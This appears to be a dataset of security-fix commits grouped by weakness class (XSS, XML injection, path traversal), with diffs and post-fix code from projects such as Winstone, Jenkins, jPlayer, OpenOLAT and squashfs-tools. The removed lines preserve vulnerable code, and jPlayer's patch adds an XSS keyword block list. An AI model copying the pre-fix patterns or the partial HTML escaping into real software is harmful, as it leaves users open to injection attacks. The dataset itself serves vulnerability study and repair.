        response.setContentLength(output.getBytes(response.getCharacterEncoding()).length);
        Writer out = response.getWriter();
        out.write(output);
        out.flush();
    }
}


--------------------
Filename: URIUtil.java
Message: escape error messages which are supposed be plain text and not markup

Diff: @@ -50,4 +50,21 @@ public class URIUtil {
         return buf.toString();
     }
 
+    /**
+     * Performs necessary escaping to render arbitrary plain text as plain text without any markup.
+     */
+    public static String htmlEscape(String text) {
+        StringBuilder buf = new StringBuilder(text.length()+64);
+        for( int i=0; i<text.length(); i++ ) {
+            char ch = text.charAt(i);
+            if(ch=='<')
+                buf.append("&lt;");
+            else
+            if(ch=='&')
+                buf.append("&amp;");
+            else
+                buf.append(ch);
+        }
+        return buf.toString();
+    }
 }

Code after:
        for (Iterator itr = r.iterator(); itr.hasNext();) {
            String token = (String) itr.next();
            if (!first)     buf.append('/');
            else            first = false;
            buf.append(token);
        }
        // translation: if (path.endsWith("/") && !buf.endsWith("/"))
        if (path.endsWith("/") && (buf.length()==0 || buf.charAt(buf.length()-1)!='/'))
            buf.append('/');
        return buf.toString();
    }

    /**
     * Performs necessary escaping to render arbitrary plain text as plain text without any markup.
     */
    public static String htmlEscape(String text) {
        StringBuilder buf = new StringBuilder(text.length()+64);
        for( int i=0; i<text.length(); i++ ) {
            char ch = text.charAt(i);
            if(ch=='<')
                buf.append("&lt;");
            else
            if(ch=='&')
                buf.append("&amp;");
            else
                buf.append(ch);
        }
        return buf.toString();
    }
}


--------------------
Filename: WinstoneResponse.java
Message: escape error messages which are supposed be plain text and not markup

Diff: @@ -805,7 +805,7 @@ public class WinstoneResponse implements HttpServletResponse {
             this.statusCode = sc;
         }
         String output = Launcher.RESOURCES.getString("WinstoneResponse.ErrorPage",
-                new String[] { sc + "", (msg == null ? "" : msg), "",
+                new String[] { sc + "", URIUtil.htmlEscape(msg == null ? "" : msg), "",
                         Launcher.RESOURCES.getString("ServerVersion"),
                         "" + new Date() });
         setContentLength(output.getBytes(getCharacterEncoding()).length);

Code after:
                            "WinstoneResponse.ErrorInErrorPage", new String[] {
                                    rd.getName(), sc + "" }, err);
                    return;
                }
            }
        }
        // If we are here there was no webapp and/or no request object, so 
        // show the default error page
        if (this.errorStatusCode == null) {
            this.statusCode = sc;
        }
        String output = Launcher.RESOURCES.getString("WinstoneResponse.ErrorPage",
                new String[] { sc + "", URIUtil.htmlEscape(msg == null ? "" : msg), "",
                        Launcher.RESOURCES.getString("ServerVersion"),
                        "" + new Date() });
        setContentLength(output.getBytes(getCharacterEncoding()).length);
        Writer out = getWriter();
        out.write(output);
        out.flush();
    }

    /**
     * @deprecated
     */
    public String encodeRedirectUrl(String url) {
        return encodeRedirectURL(url);
    }


--------------------
Filename: ZeroClipboard.as
Message: escape fix becuse XSS risk like

Diff: @@ -28,7 +28,7 @@
 			// import flashvars
 			var flashvars:Object = LoaderInfo( this.root.loaderInfo ).parameters;
 			id = flashvars.id;
-			
+			id = id.split("\\").join("\\\\");
 			// invisible button covers entire stage
 			button = new Sprite();
 			button.buttonMode = true;

Code after:
		private var id:String = '';
		private var button:Sprite;
		private var clipText:String = '';
		
		public function ZeroClipboard() {
			// constructor, setup event listeners and external interfaces
			stage.scaleMode = StageScaleMode.EXACT_FIT;
			flash.system.Security.allowDomain("*");
			
			// import flashvars
			var flashvars:Object = LoaderInfo( this.root.loaderInfo ).parameters;
			id = flashvars.id;
			id = id.split("\\").join("\\\\");
			// invisible button covers entire stage
			button = new Sprite();
			button.buttonMode = true;
			button.useHandCursor = true;
			button.graphics.beginFill(0xCCFF00);
			button.graphics.drawRect(0, 0, Math.floor(flashvars.width), Math.floor(flashvars.height));
			button.alpha = 0.0;
			addChild(button);
			button.addEventListener(MouseEvent.CLICK, clickHandler);
			
			button.addEventListener(MouseEvent.MOUSE_OVER, function(event:Event) {
				ExternalInterface.call( 'ZeroClipboard.dispatch', id, 'mouseOver', null );
			} );
			button.addEventListener(MouseEvent.MOUSE_OUT, function(event:Event) {


--------------------
Filename: View.java
Message: [FIXED SECURITY-77] XSS in iconSize cookie.

Diff: @@ -766,7 +766,7 @@ public abstract class View extends AbstractModelObject implements AccessControll
 
         {
             StaplerRequest req = Stapler.getCurrentRequest();
-            iconSize = req != null ? Functions.getCookie(req, "iconSize", "32x32") : "32x32";
+            iconSize = req != null ? Functions.validateIconSize(Functions.getCookie(req, "iconSize", "32x32")) : "32x32";
         }
 
         @Override protected void compute() throws Exception {

Code after:
            unknown = User.getUnknown();
        }

        /** @see View#getAsynchPeople */
        public AsynchPeople(View parent) {
            this.parent = parent;
            items = parent.getItems();
            unknown = null;
        }

        {
            StaplerRequest req = Stapler.getCurrentRequest();
            iconSize = req != null ? Functions.validateIconSize(Functions.getCookie(req, "iconSize", "32x32")) : "32x32";
        }

        @Override protected void compute() throws Exception {
            int itemCount = 0;
            for (Item item : items) {
                for (Job<?,?> job : item.getAllJobs()) {
                    if (job instanceof AbstractProject) {
                        AbstractProject<?,?> p = (AbstractProject) job;
                        RunList<? extends AbstractBuild<?,?>> builds = p.getBuilds();
                        int buildCount = 0;
                        for (AbstractBuild<?,?> build : builds) {
                            if (canceled()) {
                                return;
                            }


--------------------
Filename: Jplayer.as
Message: Security Fox of Flash SWF that had enabled Cross Site Scripting (XSS)

Diff: @@ -239,7 +239,7 @@ package {
 			}
 		}
 		private function illegalChar(s:String):Boolean {
-			var illegals:String = "' \" ( ) { } * + / \\ < > = document";
+			var illegals:String = "' \" ( ) { } * + / \\ < > = document alert";
 			if(Boolean(s)) { // Otherwise exception if parameter null.
 				for each (var illegal:String in illegals.split(' ')) {
 					if(s.indexOf(illegal) >= 0) {

Code after:
			var i:Number = 0;
			for each (var s:String in p) {
				if(illegalChar(s)) {
					securityIssue = true; // Illegal char found
				}
				i++;
			}
			if(i === 0 || securityIssue) {
				directAccess = true;
			}
		}
		private function illegalChar(s:String):Boolean {
			var illegals:String = "' \" ( ) { } * + / \\ < > = document alert";
			if(Boolean(s)) { // Otherwise exception if parameter null.
				for each (var illegal:String in illegals.split(' ')) {
					if(s.indexOf(illegal) >= 0) {
						return true; // Illegal char found
					}
				}
			}
			return false;
		}
		// switchType() here
		private function listenToMp3(active:Boolean):void {
			if(active) {
				myMp3Player.addEventListener(JplayerEvent.JPLAYER_ERROR, jPlayerFlashEvent);
				myMp3Player.addEventListener(JplayerEvent.JPLAYER_PROGRESS, jPlayerFlashEvent);


--------------------
Filename: JplayerStatus.as
Message: Security Fox of Flash SWF that had enabled Cross Site Scripting (XSS)

Diff: @@ -14,7 +14,7 @@
 package happyworm.jPlayer {
 	public class JplayerStatus {
 
-		public static const VERSION:String = "2.2.20"; // The version of the Flash jPlayer entity.
+		public static const VERSION:String = "2.2.23"; // The version of the Flash jPlayer entity.
 
 		public var volume:Number = 0.5; // Not affected by reset()
 		public var muted:Boolean = false; // Not affected by reset()

Code after:
 * Copyright (c) 2009 - 2013 Happyworm Ltd
 * Dual licensed under the MIT and GPL licenses.
 *  - http://www.opensource.org/licenses/mit-license.php
 *  - http://www.gnu.org/copyleft/gpl.html
 *
 * Author: Mark J Panaghiston
 * Date: 21st March 2013
 */

package happyworm.jPlayer {
	public class JplayerStatus {

		public static const VERSION:String = "2.2.23"; // The version of the Flash jPlayer entity.

		public var volume:Number = 0.5; // Not affected by reset()
		public var muted:Boolean = false; // Not affected by reset()

		public var src:String;
		public var srcError:Boolean;

		public var srcSet:Boolean;
		public var isPlaying:Boolean;
		public var isSeeking:Boolean;

		public var playOnLoad:Boolean;
		public var playOnSeek:Boolean;



--------------------
Filename: JplayerStatus.as
Message: Security Fix issue #162 for CVE-2013-2023

Diff: @@ -14,7 +14,7 @@
 package happyworm.jPlayer {
 	public class JplayerStatus {
 
-		public static const VERSION:String = "2.3.0"; // The version of the Flash jPlayer entity.
+		public static const VERSION:String = "2.3.1"; // The version of the Flash jPlayer entity.
 
 		public var volume:Number = 0.5; // Not affected by reset()
 		public var muted:Boolean = false; // Not affected by reset()

Code after:
 * Copyright (c) 2009 - 2013 Happyworm Ltd
 * Dual licensed under the MIT and GPL licenses.
 *  - http://www.opensource.org/licenses/mit-license.php
 *  - http://www.gnu.org/copyleft/gpl.html
 *
 * Author: Mark J Panaghiston
 * Date: 20th April 2013
 */

package happyworm.jPlayer {
	public class JplayerStatus {

		public static const VERSION:String = "2.3.1"; // The version of the Flash jPlayer entity.

		public var volume:Number = 0.5; // Not affected by reset()
		public var muted:Boolean = false; // Not affected by reset()

		public var src:String;
		public var srcError:Boolean;

		public var srcSet:Boolean;
		public var isPlaying:Boolean;
		public var isSeeking:Boolean;

		public var playOnLoad:Boolean;
		public var playOnSeek:Boolean;



--------------------
Filename: JplayerStatus.as
Message: Security Fix completed for issue #162 ref CVE-2013-2023

Diff: @@ -14,7 +14,7 @@
 package happyworm.jPlayer {
 	public class JplayerStatus {
 
-		public static const VERSION:String = "2.3.1"; // The version of the Flash jPlayer entity.
+		public static const VERSION:String = "2.3.2"; // The version of the Flash jPlayer entity.
 
 		public var volume:Number = 0.5; // Not affected by reset()
 		public var muted:Boolean = false; // Not affected by reset()

Code after:
 * Copyright (c) 2009 - 2013 Happyworm Ltd
 * Dual licensed under the MIT and GPL licenses.
 *  - http://www.opensource.org/licenses/mit-license.php
 *  - http://www.gnu.org/copyleft/gpl.html
 *
 * Author: Mark J Panaghiston
 * Date: 20th April 2013
 */

package happyworm.jPlayer {
	public class JplayerStatus {

		public static const VERSION:String = "2.3.2"; // The version of the Flash jPlayer entity.

		public var volume:Number = 0.5; // Not affected by reset()
		public var muted:Boolean = false; // Not affected by reset()

		public var src:String;
		public var srcError:Boolean;

		public var srcSet:Boolean;
		public var isPlaying:Boolean;
		public var isSeeking:Boolean;

		public var playOnLoad:Boolean;
		public var playOnSeek:Boolean;



--------------------
Filename: node.jsp
Message: NMS-13126: Escape foreignSource and nodeLabel string in requisition UI

Diff: @@ -311,7 +311,7 @@ function confirmAssetEdit() {
 
 <h5>
   <c:if test="${model.foreignSource != null}">
-    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPfs badge badge-secondary " title="Requisition: ${model.foreignSource}"><i class="fa fa-list-alt"></i>&nbsp;${model.foreignSource}</span>&nbsp;<span class="NPfid badge badge-secondary " title="Foreign ID: ${model.foreignId}"><i class="fa fa-qrcode"></i>&nbsp;${model.foreignId}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
+    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPfs badge badge-secondary " title="Requisition: ${fn:escapeXml(model.foreignSource)}"><i class="fa fa-list-alt"></i>&nbsp;${fn:escapeXml(model.foreignSource)}</span>&nbsp;<span class="NPfid badge badge-secondary " title="Foreign ID: ${model.foreignId}"><i class="fa fa-qrcode"></i>&nbsp;${model.foreignId}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
   </c:if>
   <c:if test="${model.foreignSource == null}">
     <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>

Code after:
<% } else { %>
    return true;
<% } %>
</c:if>
<c:if test="${model.foreignSource == null}">
  return true;
</c:if>
}
</script>

<h5>
  <c:if test="${model.foreignSource != null}">
    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPfs badge badge-secondary " title="Requisition: ${fn:escapeXml(model.foreignSource)}"><i class="fa fa-list-alt"></i>&nbsp;${fn:escapeXml(model.foreignSource)}</span>&nbsp;<span class="NPfid badge badge-secondary " title="Foreign ID: ${model.foreignId}"><i class="fa fa-qrcode"></i>&nbsp;${model.foreignId}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
  </c:if>
  <c:if test="${model.foreignSource == null}">
    <div class="NPnode">Node: <strong>${model.label}</strong>&nbsp;&nbsp;&nbsp;<span class="NPdbid badge badge-secondary " title="Database ID: ${model.id}"><i class="fa fa-database"></i>&nbsp;${model.id}</span>&nbsp;<span class="NPloc badge badge-secondary " title="Location: ${model.location}"><i class="fa fa-map-marker"></i>&nbsp;${model.location}</span> <c:if test="${model.node.hasFlows}"><span class="NPflows badge badge-secondary " title="Flows: flow data available"><i class="fa fa-exchange"></i> flow data</span></c:if></div>
  </c:if>
</h5>

  <ul class="list-inline">
    <c:url var="eventLink" value="event/list">
      <c:param name="filter" value="node=${model.id}"/>
    </c:url>
    <li class="list-inline-item">
      <a href="<c:out value="${eventLink}"/>">View Events</a>
    </li>



--------------------

********************
CWE-91: XML Injection (aka Blind XPath Injection) (49 samples)
********************
Filename: QNameCache.java
Message: #48 Validate QName inputs - throw IllegalArgumentException when qualified name contains disallowed character.

Diff: @@ -152,6 +152,8 @@ public class QNameCache {
 
         if (index < 0) {
             return get(qualifiedName, Namespace.get(uri));
+        } else if (index == 0){
+            throw new IllegalArgumentException("Qualified name cannot start with ':'.");
         } else {
             String name = qualifiedName.substring(index + 1);
             String prefix = qualifiedName.substring(0, index);

Code after:
            answer.setDocumentFactory(documentFactory);
            cache.put(localName, answer);
        }

        return answer;
    }

    public QName get(String qualifiedName, String uri) {
        int index = qualifiedName.indexOf(':');

        if (index < 0) {
            return get(qualifiedName, Namespace.get(uri));
        } else if (index == 0){
            throw new IllegalArgumentException("Qualified name cannot start with ':'.");
        } else {
            String name = qualifiedName.substring(index + 1);
            String prefix = qualifiedName.substring(0, index);

            return get(name, Namespace.get(prefix, uri));
        }
    }

    /**
     * DOCUMENT ME!
     * 
     * @param qname
     *            DOCUMENT ME!
     * 


--------------------
Filename: ChangeEMailExecuteController.java
Message: OO-5548: setup security of XStream by default

Diff: @@ -108,6 +108,7 @@ public class ChangeEMailExecuteController extends ChangeEMailController implemen
 	 */
 	public boolean changeEMail(WindowControl wControl) {
 		XStream xml = XStreamHelper.createXStreamInstance();
+		XStreamHelper.allowDefaultPackage(xml);
 		@SuppressWarnings("unchecked")
 		HashMap<String, String> mails = (HashMap<String, String>) xml.fromXML(tempKey.getEmailAddress());
 		

Code after:
			}
		}
		return false;
	}

	/**
	 * change email
	 * @param wControl
	 * @return
	 */
	public boolean changeEMail(WindowControl wControl) {
		XStream xml = XStreamHelper.createXStreamInstance();
		XStreamHelper.allowDefaultPackage(xml);
		@SuppressWarnings("unchecked")
		HashMap<String, String> mails = (HashMap<String, String>) xml.fromXML(tempKey.getEmailAddress());
		
		Identity identity = securityManager.loadIdentityByKey(tempKey.getIdentityKey());
		if (identity != null) {
			String oldEmail = identity.getUser().getEmail();
			identity.getUser().setProperty("email", mails.get("changedEMail"));
			// if old mail address closed then set the new mail address
			// unclosed
			String value = identity.getUser().getProperty("emailDisabled", null);
			if (value != null && value.equals("true")) {
				identity.getUser().setProperty("emailDisabled", "false");
			}
			identity.getUser().setProperty("email", mails.get("changedEMail"));


--------------------
Filename: LandingPagesModule.java
Message: OO-5548: setup security of XStream by default

Diff: @@ -44,6 +44,7 @@ public class LandingPagesModule extends AbstractSpringModule {
 	private static final XStream rulesXStream;
 	static {
 		rulesXStream = XStreamHelper.createXStreamInstance();
+		XStreamHelper.allowDefaultPackage(rulesXStream);
 		rulesXStream.alias("rules", Rules.class);
 		rulesXStream.alias("rule", Rule.class);
 	}

Code after:
/**
 * 
 * Initial date: 15.05.2014<br>
 * @author srosse, stephane.rosse@frentix.com, http://www.frentix.com
 *
 */
@Service("landingPagesModule")
public class LandingPagesModule extends AbstractSpringModule {
	private static final String CONFIG_RULES = "rules";
	private static final XStream rulesXStream;
	static {
		rulesXStream = XStreamHelper.createXStreamInstance();
		XStreamHelper.allowDefaultPackage(rulesXStream);
		rulesXStream.alias("rules", Rules.class);
		rulesXStream.alias("rule", Rule.class);
	}
	
	private Rules rules;
	
	@Autowired
	public LandingPagesModule(CoordinatorManager coordinatorManager) {
		super(coordinatorManager);
	}

	@Override
	public void init() {
		String rulesObj = getStringPropertyValue(CONFIG_RULES, true);


--------------------
Filename: DiscoveryXStream.java
Message: OO-5548: setup security of XStream by default

Diff: @@ -39,7 +39,6 @@ class DiscoveryXStream {
 	
 	private static final XStream xstream = XStreamHelper.createXStreamInstance();
 	static {
-		XStream.setupDefaultSecurity(xstream);
 		Class<?>[] types = new Class[] {
 				DiscoveryImpl.class, NetZoneImpl.class, AppImpl.class, ActionImpl.class, ProofKeyImpl.class
 		};

Code after:
import com.thoughtworks.xstream.security.ExplicitTypePermission;

/**
 * 
 * Initial date: 1 Mar 2019<br>
 * @author uhensler, urs.hensler@frentix.com, http://www.frentix.com
 *
 */
class DiscoveryXStream {
	
	private static final XStream xstream = XStreamHelper.createXStreamInstance();
	static {
		Class<?>[] types = new Class[] {
				DiscoveryImpl.class, NetZoneImpl.class, AppImpl.class, ActionImpl.class, ProofKeyImpl.class
		};
		xstream.addPermission(new ExplicitTypePermission(types));

		xstream.alias("wopi-discovery", DiscoveryImpl.class);
		xstream.aliasField("proof-key", DiscoveryImpl.class, "proofKey");
		xstream.addImplicitCollection(DiscoveryImpl.class, "netZones");
		
		xstream.alias("net-zone", NetZoneImpl.class);
		xstream.aliasAttribute(NetZoneImpl.class, "name", "name");
		xstream.addImplicitCollection(NetZoneImpl.class, "apps");
		
		xstream.alias("app", AppImpl.class);
		xstream.aliasAttribute(AppImpl.class, "name", "name");


--------------------
Filename: LicenseXStreamHelper.java
Message: OO-5548: setup security of XStream by default

Diff: @@ -44,6 +44,7 @@ class LicenseXStreamHelper {
 	
 	private static final XStream licenseXStream = XStreamHelper.createXStreamInstanceForDBObjects();
 	static {
+		XStreamHelper.allowDefaultPackage(licenseXStream);
 		licenseXStream.alias("license", LicenseImpl.class);
 		licenseXStream.alias("license", ResourceLicenseImpl.class);
 		licenseXStream.alias("licenseType", LicenseTypeImpl.class);

Code after:
 * 
 * Initial date: 16.03.2018<br>
 * @author uhensler, urs.hensler@frentix.com, http://www.frentix.com
 *
 */
@Component
class LicenseXStreamHelper {
	
	private static final Logger log = Tracing.createLoggerFor(LicenseXStreamHelper.class);
	
	private static final XStream licenseXStream = XStreamHelper.createXStreamInstanceForDBObjects();
	static {
		XStreamHelper.allowDefaultPackage(licenseXStream);
		licenseXStream.alias("license", LicenseImpl.class);
		licenseXStream.alias("license", ResourceLicenseImpl.class);
		licenseXStream.alias("licenseType", LicenseTypeImpl.class);
		licenseXStream.ignoreUnknownElements();
		licenseXStream.omitField(LicenseImpl.class, "creationDate");
		licenseXStream.omitField(LicenseImpl.class, "lastModified");
		licenseXStream.omitField(ResourceLicenseImpl.class, "creationDate");
		licenseXStream.omitField(ResourceLicenseImpl.class, "lastModified");
		licenseXStream.omitField(LicenseTypeImpl.class, "creationDate");
		licenseXStream.omitField(LicenseTypeImpl.class, "lastModified");
	}
	
	String toXml(License license) {
		if (license == null) return null;


--------------------
Filename: VFSXStream.java
Message: OO-5548: setup security of XStream by default

Diff: @@ -53,7 +53,6 @@ public class VFSXStream {
 	private static XStream mystream;
 	static {
 		mystream = XStreamHelper.createXStreamInstance();
-		XStream.setupDefaultSecurity(mystream);
 		Class<?>[] types = new Class[] {
 				VersionsFileImpl.class, RevisionFileImpl.class, VFSRevision.class,
 				VFSMetadata.class, VFSMetadataImpl.class, Identity.class, IdentityImpl.class,

Code after:

/**
 * 
 * Initial date: 13 mars 2019<br>
 * @author srosse, stephane.rosse@frentix.com, http://www.frentix.com
 *
 */
public class VFSXStream {
	
	private static XStream mystream;
	static {
		mystream = XStreamHelper.createXStreamInstance();
		Class<?>[] types = new Class[] {
				VersionsFileImpl.class, RevisionFileImpl.class, VFSRevision.class,
				VFSMetadata.class, VFSMetadataImpl.class, Identity.class, IdentityImpl.class,
				LicenseType.class, LicenseTypeImpl.class
			};
		mystream.addPermission(new ExplicitTypePermission(types));
		
		mystream.alias("versions", VersionsFileImpl.class);
		mystream.alias("revision", RevisionFileImpl.class);
		mystream.omitField(VersionsFileImpl.class, "currentVersion");
		mystream.omitField(VersionsFileImpl.class, "versionFile");
		mystream.omitField(RevisionFileImpl.class, "current");
		mystream.omitField(RevisionFileImpl.class, "container");
		mystream.omitField(RevisionFileImpl.class, "file");
		mystream.omitField(VFSMetadataImpl.class, "originFile");


--------------------
Filename: SiteDefinitions.java
Message: OO-5548: setup security of XStream by default

Diff: @@ -77,6 +77,7 @@ public class SiteDefinitions extends AbstractSpringModule {
 	
 	private static final XStream xStream = XStreamHelper.createXStreamInstance();
 	static {
+		XStreamHelper.allowDefaultPackage(xStream);
 		xStream.alias("coursesite", CourseSiteConfiguration.class);
 		xStream.alias("languageConfig", LanguageConfiguration.class);
 		xStream.alias("siteconfig", SiteConfiguration.class);

Code after:
	
	private String configSite1;
	private String configSite2;
	private String configSite3;
	private String configSite4;
	private String sitesSettings;
	
	@Autowired
	private List<SiteDefinition> configurers;
	
	private static final XStream xStream = XStreamHelper.createXStreamInstance();
	static {
		XStreamHelper.allowDefaultPackage(xStream);
		xStream.alias("coursesite", CourseSiteConfiguration.class);
		xStream.alias("languageConfig", LanguageConfiguration.class);
		xStream.alias("siteconfig", SiteConfiguration.class);
	}
	
	@Autowired
	public SiteDefinitions(CoordinatorManager coordinatorManager) {
		super(coordinatorManager);
	}
	
	
	
	public String getConfigCourseSite1() {
		return configSite1;


--------------------
Filename: HistoryManager.java
Message: OO-5548: setup security of XStream by default

Diff: @@ -57,6 +57,9 @@ public class HistoryManager {
 	private static XStream historyReadStream = XStreamHelper.createXStreamInstance();
 	private static XStream historyWriteStream = XStreamHelper.createXStreamInstance();
 	static {
+		XStreamHelper.allowDefaultPackage(historyReadStream);
+		XStreamHelper.allowDefaultPackage(historyWriteStream);
+		
 		//xstream config
 		historyReadStream.omitField(BusinessGroup.class, "type");
 		historyReadStream.omitField(BusinessGroup.class, "ownerGroup");

Code after:
 * <p>
 * Initial Date:  26 jan. 2011 <br>
 * @author srosse, stephane.rosse@frentix.com, www.frentix.com
 */
@Service("historyManager")
public class HistoryManager {
	
	private static final Logger log = Tracing.createLoggerFor(HistoryManager.class);
	
	private static XStream historyReadStream = XStreamHelper.createXStreamInstance();
	private static XStream historyWriteStream = XStreamHelper.createXStreamInstance();
	static {
		XStreamHelper.allowDefaultPackage(historyReadStream);
		XStreamHelper.allowDefaultPackage(historyWriteStream);
		
		//xstream config
		historyReadStream.omitField(BusinessGroup.class, "type");
		historyReadStream.omitField(BusinessGroup.class, "ownerGroup");
		historyReadStream.omitField(BusinessGroup.class, "partipiciantGroup");
		historyReadStream.omitField(BusinessGroup.class, "waitingGroup");
		historyReadStream.omitField(BusinessGroup.class, "groupContext");
		historyReadStream.omitField(BusinessGroupImpl.class, "type");
		historyReadStream.omitField(BusinessGroupImpl.class, "ownerGroup");
		historyReadStream.omitField(BusinessGroupImpl.class, "partipiciantGroup");
		historyReadStream.omitField(BusinessGroupImpl.class, "waitingGroup");
		historyReadStream.omitField(BusinessGroupImpl.class, "groupContext");
		historyReadStream.omitField(RepositoryEntry.class, "ownerGroup");
		historyReadStream.omitField(RepositoryEntry.class, "participantGroup");
		historyReadStream.omitField(RepositoryEntry.class, "tutorGroup");


--------------------
Filename: DbStorage.java
Message: OO-5548: setup security of XStream by default

Diff: @@ -57,6 +57,7 @@ public class DbStorage implements PreferencesStorage {
 	
 	private static final XStream xstream = XStreamHelper.createXStreamInstance();
 	static {
+		XStreamHelper.allowDefaultPackage(xstream);
 		xstream.ignoreUnknownElements();
 	}
 

Code after:
 * Initial Date: 21.06.2006 <br>
 * 
 * @author Felix Jost
 */
public class DbStorage implements PreferencesStorage {
	
	private static final Logger log = Tracing.createLoggerFor(DbStorage.class);

	static final String USER_PROPERTY_KEY = "v2guipreferences";
	
	private static final XStream xstream = XStreamHelper.createXStreamInstance();
	static {
		XStreamHelper.allowDefaultPackage(xstream);
		xstream.ignoreUnknownElements();
	}

	@Override
	public Preferences getPreferencesFor(Identity identity, boolean useTransientPreferences) {
		if (useTransientPreferences) {
			return createEmptyDbPrefs(identity,true);
		} else {			
			try {
				return getPreferencesFor(identity);
			} catch (Exception e) {
				log.error("Retry after exception", e);
				return getPreferencesFor(identity);
			}


--------------------
Filename: CourseXStreamAliases.java
Message: OO-5548: setup security of XStream by default

Diff: @@ -95,6 +95,9 @@ public class CourseXStreamAliases {
 	 * @return
 	 */
 	static {
+		XStreamHelper.allowDefaultPackage(readXstream);
+		XStreamHelper.allowDefaultPackage(writeXstream);
+		
 		//write XStream
 		writeXstream.alias("com.frentix.olat.course.nodes.ViteroCourseNode", ViteroCourseNode.class);
 		writeXstream.alias("BookSection", BookSectionImpl.class);

Code after:
public class CourseXStreamAliases {
	
	private static final XStream readXstream = XStreamHelper.createXStreamInstance();
	private static final XStream writeXstream = XStreamHelper.createXStreamInstance();
	

	/**
	 * Used for reading editortreemodel.xml and runstructure.xml.
	 * Creates a new XStream with the aliases used in the mentioned xml files.
	 * @return
	 */
	static {
		XStreamHelper.allowDefaultPackage(readXstream);
		XStreamHelper.allowDefaultPackage(writeXstream);
		
		//write XStream
		writeXstream.alias("com.frentix.olat.course.nodes.ViteroCourseNode", ViteroCourseNode.class);
		writeXstream.alias("BookSection", BookSectionImpl.class);
		//end write XStream
		
		////////////////////////////////////////////////////////////////////////////////////////////////
		//start read configuration (mostly for compatibility with OLAT 7.3 and greater)
		readXstream.alias("CourseConfig", CourseConfig.class);
		readXstream.alias("com.frentix.olat.course.nodes.ViteroCourseNode", ViteroCourseNode.class);
		readXstream.alias("org.olat.course.nodes.QTI21AssessmentCourseNode", IQTESTCourseNode.class);
		readXstream.alias("CourseEditorTreeModel", CourseEditorTreeModel.class);
		readXstream.alias("CourseEditorTreeNode", CourseEditorTreeNode.class);
		readXstream.alias("Structure", Structure.class);
		readXstream.alias("AssessableCourseNode", CourseNode.class);


--------------------

********************
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (43 samples)
********************
Filename: CreateJobCommand.java
Message: [FIXED SECURITY-108] Check job name created via CLI

Diff: @@ -72,6 +72,7 @@ public class CreateJobCommand extends CLICommand {
             name = name.substring(i + 1);
         }
 
+        Jenkins.checkGoodName(name);
         ig.createProjectFromXML(name, stdin);
         return 0;
     }

Code after:
            if (item == null) {
                throw new IllegalArgumentException("Unknown ItemGroup " + group);
            }

            if (item instanceof ModifiableTopLevelItemGroup) {
                ig = (ModifiableTopLevelItemGroup) item;
            } else {
                throw new IllegalArgumentException("Can't create job from CLI in " + group);
            }
            name = name.substring(i + 1);
        }

        Jenkins.checkGoodName(name);
        ig.createProjectFromXML(name, stdin);
        return 0;
    }
}




--------------------
Filename: unsquash-12.c
Message: Unsquashfs: additional write outside destination directory exploit fix

An issue on github (https://github.com/plougher/squashfs-tools/issues/72)
showed how some specially crafted Squashfs filesystems containing
invalid file names (with '/' and '..') can cause Unsquashfs to write
files outside of the destination directory.

Since then it has been shown that specially crafted Squashfs filesystems
that contain a symbolic link pointing outside of the destination directory,
coupled with an identically named file within the same directory, can
cause Unsquashfs to write files outside of the destination directory.

Specifically the symbolic link produces a pathname pointing outside
of the destination directory, which is then followed when writing the
duplicate identically named file within the directory.

This commit fixes this exploit by explictly checking for duplicate
filenames within a directory.  As directories in v2.1, v3.x, and v4.0
filesystems are sorted, this is achieved by checking for consecutively
identical filenames.  Additionally directories are checked to
ensure they are sorted, to avoid attempts to evade the duplicate
check.

Version 1.x and 2.0 filesystems (where the directories were unsorted)
are sorted and then the above duplicate filename check is applied.

Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>

Diff: @@ -0,0 +1,110 @@
+/*
+ * Unsquash a squashfs filesystem.  This is a highly compressed read only
+ * filesystem.
+ *
+ * Copyright (c) 2021
+ * Phillip Lougher <phillip@squashfs.org.uk>
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License
+ * as published by the Free Software Foundation; either version 2,
+ * or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
+ *
+ * unsquash-12.c
+ *
+ * Helper functions used by unsquash-1 and unsquash-2.
+ */
+
+#include "unsquashfs.h"
+
+/*
